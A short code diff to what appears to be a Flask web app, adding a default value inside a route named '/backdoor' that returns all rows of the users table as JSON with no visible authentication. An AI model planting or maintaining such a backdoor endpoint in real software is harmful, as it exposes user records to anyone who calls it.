@@ -18,6 +18,7 @@ ROBOT = None
 # Backdoor 
 @app.route('/backdoor')
 def backdoor():
+    results = ""
     if DATABASE:
         results = DATABASE.ViewQuery("SELECT * FROM users")
     return jsonify(results)
